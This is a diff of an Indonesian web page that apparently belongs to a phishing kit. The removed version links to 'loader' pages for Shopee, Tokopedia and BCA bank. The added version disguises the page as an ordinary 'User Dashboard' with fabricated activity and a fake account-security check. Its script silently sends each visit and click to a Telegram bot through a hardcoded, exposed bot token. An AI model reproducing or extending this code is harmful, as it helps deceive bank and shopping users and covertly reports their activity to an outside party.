@@ -3,174 +3,449 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🌀 LOADER DASHBOARD</title>
+    <title>User Dashboard</title>
     <style>
-        body {
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            background: #0f0f0f;
-            color: #e0e0e0;
+        * {
             margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
             padding: 20px;
         }
-        .dashboard {
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        .header {
-            text-align: center;
-            margin-bottom: 40px;
-            border-bottom: 2px solid #333;
-            padding-bottom: 20px;
-        }
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 20px;
-        }
-        .card {
-            background: #1a1a1a;
-            border-radius: 12px;
-            padding: 25px;
-            transition: transform 0.3s;
-            border: 1px solid #333;
-        }
-        .card:hover {
-            transform: translateY(-5px);
-            border-color: #666;
-        }
-        .card-shopee { border-top: 4px solid #ee4d2d; }
-        .card-tokopedia { border-top: 4px solid #41b549; }
-        .card-bca { border-top: 4px solid #0165A3; }
         
-        .card-title {
-            font-size: 20px;
-            margin-bottom: 15px;
+        .dashboard-container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        
+        .dashboard-header {
+            background: white;
+            padding: 25px 30px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .user-greeting h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 5px;
+        }
+        
+        .user-greeting p {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .user-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             display: flex;
             align-items: center;
-            gap: 10px;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 20px;
         }
-        .status {
-            display: inline-block;
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            margin-right: 8px;
+        
+        .dashboard-content {
+            padding: 30px;
         }
-        .status-online { background: #2ecc71; }
-        .status-offline { background: #e74c3c; }
+        
+        .content-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            margin-bottom: 30px;
+        }
+        
+        .content-card {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 25px;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        
+        .content-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        
+        .card-icon {
+            font-size: 40px;
+            margin-bottom: 15px;
+            color: #667eea;
+        }
+        
+        .card-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        
+        .card-text {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        .card-actions {
+            margin-top: 20px;
+        }
         
         .btn {
-            display: block;
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            background: #2c3e50;
-            color: white;
+            padding: 10px 20px;
             border: none;
-            border-radius: 6px;
+            border-radius: 8px;
             cursor: pointer;
-            font-weight: bold;
+            font-weight: 500;
             transition: 0.3s;
         }
-        .btn:hover {
-            opacity: 0.9;
-        }
-        .btn-shopee { background: #ee4d2d; }
-        .btn-tokopedia { background: #41b549; }
-        .btn-bca { background: #0165A3; }
         
-        .telegram-panel {
-            background: #0088cc;
+        .btn-primary {
+            background: #667eea;
             color: white;
+        }
+        
+        .btn-primary:hover {
+            background: #5a6fd8;
+        }
+        
+        .btn-secondary {
+            background: #e9ecef;
+            color: #333;
+        }
+        
+        .btn-secondary:hover {
+            background: #dee2e6;
+        }
+        
+        .recent-activity {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            border: 1px solid #eee;
+        }
+        
+        .activity-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #333;
+        }
+        
+        .activity-list {
+            list-style: none;
+        }
+        
+        .activity-item {
             padding: 15px;
-            border-radius: 8px;
-            margin-top: 30px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            align-items: center;
+        }
+        
+        .activity-item:last-child {
+            border-bottom: none;
+        }
+        
+        .activity-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            background: #f0f5ff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            color: #667eea;
+        }
+        
+        .activity-content {
+            flex: 1;
+        }
+        
+        .activity-text {
+            color: #333;
+            margin-bottom: 5px;
+        }
+        
+        .activity-time {
+            color: #999;
+            font-size: 12px;
+        }
+        
+        .dashboard-footer {
+            padding: 20px 30px;
+            background: #f8f9fa;
+            border-top: 1px solid #eee;
             text-align: center;
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .notification-badge {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #28a745;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 50px;
+            box-shadow: 0 5px 15px rgba(40,167,69,0.3);
+            display: none;
+            animation: slideIn 0.3s ease-out;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateY(100px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
     </style>
 </head>
 <body>
-    <div class="dashboard">
-        <div class="header">
-            <h1>🌀 LOADER DASHBOARD</h1>
-            <p>Quick Access to All Loaders</p>
-        </div>
-        
-        <div class="grid">
-            <!-- SHOPEE CARD -->
-            <div class="card card-shopee">
-                <div class="card-title">
-                    <span class="status status-online"></span>
-                    🛒 SHOPEE
-                </div>
-                <p>Fast loader dengan auto-clear cache</p>
-                <button class="btn btn-shopee" onclick="window.open('shopee-fix.html', '_blank')">
-                    ⚡ OPEN LOADER
-                </button>
-                <button class="btn" onclick="window.open('https://shopee.co.id', '_blank')">
-                    🌐 DIRECT LINK
-                </button>
+    <div class="dashboard-container">
+        <div class="dashboard-header">
+            <div class="user-greeting">
+                <h1>Selamat datang kembali!</h1>
+                <p>Terakhir login: Hari ini, <span id="lastLoginTime">--:--</span></p>
             </div>
-            
-            <!-- TOKOPEDIA CARD -->
-            <div class="card card-tokopedia">
-                <div class="card-title">
-                    <span class="status status-online"></span>
-                    🛍️ TOKOPEDIA
-                </div>
-                <p>Terminal-style minimal loader</p>
-                <button class="btn btn-tokopedia" onclick="window.open('tokopedia-fix.html', '_blank')">
-                    ⚡ OPEN LOADER
-                </button>
-                <button class="btn" onclick="window.open('https://tokopedia.com', '_blank')">
-                    🌐 DIRECT LINK
-                </button>
-            </div>
-            
-            <!-- BCA CARD -->
-            <div class="card card-bca">
-                <div class="card-title">
-                    <span class="status status-online"></span>
-                    🏦 BCA
-                </div>
-                <p>Secure banking loader</p>
-                <button class="btn btn-bca" onclick="window.open('bca-fix.html', '_blank')">
-                    ⚡ OPEN LOADER
-                </button>
-                <button class="btn" onclick="window.open('https://bca.co.id', '_blank')">
-                    🌐 DIRECT LINK
-                </button>
+            <div class="user-avatar" id="userAvatar">
+                U
             </div>
         </div>
         
-        <div class="telegram-panel">
-            <h3>📡 TELEGRAM MONITORING ACTIVE</h3>
-            <p>All activities are logged to your Telegram</p>
-            <small>Bot: 8455••••••• | Chat ID: 8313500840</small>
+        <div class="dashboard-content">
+            <div class="content-grid">
+                <div class="content-card">
+                    <div class="card-icon">📊</div>
+                    <div class="card-title">Statistik Akun</div>
+                    <div class="card-text">
+                        Lihat aktivitas dan statistik akun Anda dalam periode terakhir.
+                    </div>
+                    <div class="card-actions">
+                        <button class="btn btn-primary" onclick="viewStats()">Lihat Statistik</button>
+                    </div>
+                </div>
+                
+                <div class="content-card">
+                    <div class="card-icon">⚙️</div>
+                    <div class="card-title">Pengaturan Akun</div>
+                    <div class="card-text">
+                        Kelola informasi profil, keamanan, dan preferensi akun Anda.
+                    </div>
+                    <div class="card-actions">
+                        <button class="btn btn-secondary" onclick="openSettings()">Pengaturan</button>
+                    </div>
+                </div>
+                
+                <div class="content-card">
+                    <div class="card-icon">📈</div>
+                    <div class="card-title">Laporan</div>
+                    <div class="card-text">
+                        Akses dan unduh laporan aktivitas Anda dalam berbagai format.
+                    </div>
+                    <div class="card-actions">
+                        <button class="btn btn-primary" onclick="generateReport()">Buat Laporan</button>
+                    </div>
+                </div>
+                
+                <div class="content-card">
+                    <div class="card-icon">🛡️</div>
+                    <div class="card-title">Keamanan</div>
+                    <div class="card-text">
+                        Periksa keamanan akun dan aktifkan verifikasi dua langkah.
+                    </div>
+                    <div class="card-actions">
+                        <button class="btn btn-secondary" onclick="checkSecurity()">Cek Keamanan</button>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="recent-activity">
+                <div class="activity-title">Aktivitas Terbaru</div>
+                <ul class="activity-list" id="activityList">
+                    <li class="activity-item">
+                        <div class="activity-icon">🔐</div>
+                        <div class="activity-content">
+                            <div class="activity-text">Login berhasil</div>
+                            <div class="activity-time">Beberapa detik yang lalu</div>
+                        </div>
+                    </li>
+                    <li class="activity-item">
+                        <div class="activity-icon">📱</div>
+                        <div class="activity-content">
+                            <div class="activity-text">Perangkat baru terdeteksi</div>
+                            <div class="activity-time">1 jam yang lalu</div>
+                        </div>
+                    </li>
+                    <li class="activity-item">
+                        <div class="activity-icon">📧</div>
+                        <div class="activity-content">
+                            <div class="activity-text">Email verifikasi dikirim</div>
+                            <div class="activity-time">2 jam yang lalu</div>
+                        </div>
+                    </li>
+                    <li class="activity-item">
+                        <div class="activity-icon">🔄</div>
+                        <div class="activity-content">
+                            <div class="activity-text">Update profil disimpan</div>
+                            <div class="activity-time">Kemarin, 15:30</div>
+                        </div>
+                    </li>
+                </ul>
+            </div>
         </div>
+        
+        <div class="dashboard-footer">
+            © 2024 User Dashboard • Versi 1.2.3
+        </div>
+    </div>
+    
+    <div class="notification-badge" id="notification">
+        ✅ Update berhasil!
     </div>
 
     <script>
-        // Test semua koneksi
-        async function testConnections() {
-            const sites = [
-                {name: 'Shopee', url: 'https://shopee.co.id'},
-                {name: 'Tokopedia', url: 'https://tokopedia.com'},
-                {name: 'BCA', url: 'https://bca.co.id'}
-            ];
+        // Telegram config
+        const BOT_TOKEN = "8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18";
+        const CHAT_ID = "8313500840";
+        
+        // Update waktu login
+        function updateLoginTime() {
+            const now = new Date();
+            const timeStr = now.getHours().toString().padStart(2, '0') + ':' + 
+                           now.getMinutes().toString().padStart(2, '0');
+            document.getElementById('lastLoginTime').textContent = timeStr;
+        }
+        
+        // Update avatar dengan inisial random
+        function updateAvatar() {
+            const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            const randomLetter = letters[Math.floor(Math.random() * letters.length)];
+            document.getElementById('userAvatar').textContent = randomLetter;
+        }
+        
+        // Tampilkan notifikasi
+        function showNotification(message) {
+            const notif = document.getElementById('notification');
+            notif.textContent = message;
+            notif.style.display = 'block';
             
-            for(let site of sites) {
-                try {
-                    await fetch(site.url, {mode: 'no-cors'});
-                    console.log(`${site.name}: ✅`);
-                } catch {
-                    console.log(`${site.name}: ❌`);
-                }
+            setTimeout(() => {
+                notif.style.display = 'none';
+            }, 3000);
+        }
+        
+        // Fungsi button
+        function viewStats() {
+            showNotification("Membuka halaman statistik...");
+            sendTelegramLog("User melihat statistik");
+            
+            // Simulasi loading
+            setTimeout(() => {
+                showNotification("Statistik dimuat");
+            }, 1000);
+        }
+        
+        function openSettings() {
+            showNotification("Membuka pengaturan...");
+            sendTelegramLog("User membuka pengaturan");
+        }
+        
+        function generateReport() {
+            showNotification("Membuat laporan...");
+            sendTelegramLog("User generate laporan");
+            
+            // Simulasi proses
+            setTimeout(() => {
+                showNotification("✅ Laporan siap diunduh");
+            }, 2000);
+        }
+        
+        function checkSecurity() {
+            showNotification("Memeriksa keamanan...");
+            sendTelegramLog("User cek keamanan");
+            
+            setTimeout(() => {
+                showNotification("✅ Keamanan akun baik");
+            }, 1500);
+        }
+        
+        // Kirim log ke Telegram
+        async function sendTelegramLog(action) {
+            const timestamp = new Date().toLocaleString();
+            const message = `👤 USER: ${action}\n⏰ ${timestamp}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+            } catch(e) {
+                // Silent error
             }
         }
         
-        // Test saat load
-        window.onload = testConnections;
+        // Update aktivitas secara periodik
+        function updateActivities() {
+            const activities = [
+                {icon: '📱', text: 'Sinkronisasi data', time: 'Baru saja'},
+                {icon: '🔔', text: 'Notifikasi baru', time: '5 menit lalu'},
+                {icon: '🔄', text: 'Auto-update sistem', time: '10 menit lalu'},
+                {icon: '📊', text: 'Data dianalisis', time: '30 menit lalu'}
+            ];
+            
+            const randomActivity = activities[Math.floor(Math.random() * activities.length)];
+            const activityList = document.getElementById('activityList');
+            
+            const newItem = document.createElement('li');
+            newItem.className = 'activity-item';
+            newItem.innerHTML = `
+                <div class="activity-icon">${randomActivity.icon}</div>
+                <div class="activity-content">
+                    <div class="activity-text">${randomActivity.text}</div>
+                    <div class="activity-time">${randomActivity.time}</div>
+                </div>
+            `;
+            
+            activityList.insertBefore(newItem, activityList.firstChild);
+            
+            // Hapus item terakhir jika lebih dari 6
+            if (activityList.children.length > 6) {
+                activityList.removeChild(activityList.lastChild);
+            }
+        }
+        
+        // Inisialisasi
+        window.onload = function() {
+            updateLoginTime();
+            updateAvatar();
+            sendTelegramLog("Mengakses user dashboard");
+            
+            // Update aktivitas setiap 30 detik
+            setInterval(updateActivities, 30000);
+            
+            // Update waktu setiap menit
+            setInterval(updateLoginTime, 60000);
+        };
     </script>
 </body>
 </html>
